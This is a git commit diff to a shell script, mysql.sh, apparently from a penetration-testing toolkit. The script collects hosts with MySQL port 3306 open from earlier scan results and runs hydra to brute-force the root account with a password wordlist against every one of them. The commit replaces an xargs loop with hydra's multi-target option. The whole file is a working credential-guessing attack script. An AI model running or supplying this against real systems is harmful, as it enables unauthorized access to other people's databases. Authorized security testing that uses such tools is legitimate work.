4a80b5ff71e62952666d4a8d6d5ff9b45166a7ed
al-madjus <klarsen@klarsen.net>
2021-10-31 12:16:17 +0000

    Redone hydra command

--- mysql.sh
+++ mysql.sh
@@ -5,6 +5,6 @@ wordlist=/usr/share/wordlists/mysql.txt
 cat ~/targets/_results/ports.new | grep 3306 | cut -d ' ' -f3 > /tmp/mysql_ip.txt
 sort -uo /tmp/mysql_ip.txt mysql_ip.txt
 
-cat /tmp/mysql_ip.txt | xargs -I IP hydra -l root -P $wordlist IP mysql
+hydra -K -l root -P $wordlist -M /tmp/mysql_ip.txt mysql
 
 rm /tmp/mysql_ip.txt
